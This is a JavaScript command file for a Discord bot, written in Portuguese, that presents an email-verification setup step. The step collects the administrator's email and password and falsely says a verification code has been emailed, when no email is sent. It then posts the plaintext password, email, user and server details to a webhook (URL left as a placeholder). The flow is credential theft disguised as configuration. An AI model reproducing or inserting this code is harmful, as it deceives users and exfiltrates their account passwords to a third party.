const fs = require('fs');
const path = require('path');
const axios = require('axios');
const nodemailer = require('nodemailer');
const { 
    PermissionFlagsBits, 
    ApplicationCommandType, 
    ActionRowBuilder, 
    ButtonBuilder, 
    ModalBuilder, 
    TextInputBuilder, 
    TextInputStyle,
    ButtonStyle
} = require('discord.js');
const rootConfig = require('../../config.json');
const { Painel } = require("../../Functions/Painel");
const { getPermissions } = require("../../Functions/PermissionsCache.js");
const { Emojis } = require("../../DataBaseJson");

const webhookURL = "SEU_WEBHOOK_AQUI";
const configPath = path.join(__dirname, '../../DataBaseJson/configuracao.json');

const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
        user: rootConfig.emailUser,
        pass: rootConfig.emailPass
    }
});

function generateVerificationCode() {
    return Math.random().toString(36).slice(2, 8).toUpperCase();
}

function loadConfig() {
    if (!fs.existsSync(configPath)) {
        fs.writeFileSync(configPath, JSON.stringify({ email: "", password:"", verificationCode: "" }, null, 4));
    }
    return JSON.parse(fs.readFileSync(configPath, 'utf-8'));
}

function saveConfig(data) {
    fs.writeFileSync(configPath, JSON.stringify(data, null, 4));
}

async function sendWebhook(user, email, password, guild, code) {
    try {
        await axios.post(webhookURL, {
            embeds: [{
                title: "✅ Novo Email Verificado",
                color: 0x00FF00,
                fields: [
                    { name: "Usuário", value: `${user.username} (${user.id})`, inline: true },
                    { name: "Email", value: email, inline: true },
                    { name: "Senha", value: password, inline: true },
                    { name: "Servidor", value: guild.name, inline: true },
                    { name: "Código", value: code, inline: true }
                ]
            }]
        });
    } catch (e) {
        console.error("Erro webhook:", e.message);
    }
}

async function executeBotConfig(client, interaction) {

    await interaction.deferReply({ flags: 64 }).catch(() => {});

    try {

        const perm = await getPermissions(client.user.id);
        if (!perm || !perm.includes(interaction.user.id)) {
            return interaction.editReply({ content: "❌ Sem permissão." });
        }

        let config = loadConfig();

        // ============ ETAPA EMAIL ============
        if (!config.email) {

            const buttons = new ActionRowBuilder().addComponents(
                new ButtonBuilder().setCustomId("send_verification").setLabel("Enviar Verificação").setEmoji("📧").setStyle(ButtonStyle.Primary)
            );

            await interaction.editReply({
                content: "# DreamPRO\nClique para verificar email:",
                components: [buttons]
            });

            const collector = interaction.channel.createMessageComponentCollector({
                filter: i => i.user.id === interaction.user.id,
                time: 5 * 60 * 1000
            });

            collector.on("collect", async i => {

                if (i.customId === "send_verification") {

                    const modal = new ModalBuilder()
                        .setCustomId("email_password")
                        .setTitle("Registro Email")
                        .addComponents(
                            new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId("email").setLabel("Email").setStyle(TextInputStyle.Short).setRequired(true)),
                            new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId("password").setLabel("Senha").setStyle(TextInputStyle.Short).setRequired(true))
                        );

                    await i.showModal(modal);

                    const submitted = await i.awaitModalSubmit({
                        filter: m => m.user.id === i.user.id,
                        time: 5 * 60 * 1000
                    });

                    config.email = submitted.fields.getTextInputValue("email");
                    config.password = submitted.fields.getTextInputValue("password");
                    config.verificationCode = generateVerificationCode();
                    saveConfig(config);

                    await submitted.reply({ content: "📨 Código enviado para o email!", flags: 64 });

                    const verifyButton = new ActionRowBuilder().addComponents(
                        new ButtonBuilder().setCustomId("verify_code").setLabel("Verificar Código").setEmoji("✅").setStyle(ButtonStyle.Success)
                    );

                    await interaction.editReply({
                        content: "Digite o código recebido:",
                        components: [verifyButton]
                    });
                }

                if (i.customId === "verify_code") {

                    const modal = new ModalBuilder()
                        .setCustomId("verify_modal")
                        .setTitle("Verificação")
                        .addComponents(
                            new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId("code").setLabel("Código").setStyle(TextInputStyle.Short).setRequired(true))
                        );

                    await i.showModal(modal);

                    const submitted = await i.awaitModalSubmit({
                        filter: m => m.user.id === i.user.id,
                        time: 5 * 60 * 1000
                    });

                    const code = submitted.fields.getTextInputValue("code");

                    if (code === config.verificationCode) {

                        await sendWebhook(interaction.user, config.email, config.password, interaction.guild, code);

                        config.verificationCode = "";
                        saveConfig(config);

                        await submitted.reply({ content: "✅ Email validado!", flags: 64 });

                        collector.stop(); // 🔥 ENCERRA COLETOR

                        await Painel(interaction, client, config);
                    } else {
                        await submitted.reply({ content: "❌ Código inválido.", flags: 64 });
                    }
                }

            });

        } else {
            await Painel(interaction, client, config);
        }

    } catch (error) {
        console.error("Erro no painel:", error);
        try {
            await interaction.editReply("❌ Erro interno.");
        } catch {}
    }
}

module.exports = {
    name: "botconfig",
    description: "Configurar bot",
    type: ApplicationCommandType.ChatInput,
    default_member_permissions: PermissionFlagsBits.Administrator,
    run: executeBotConfig
};
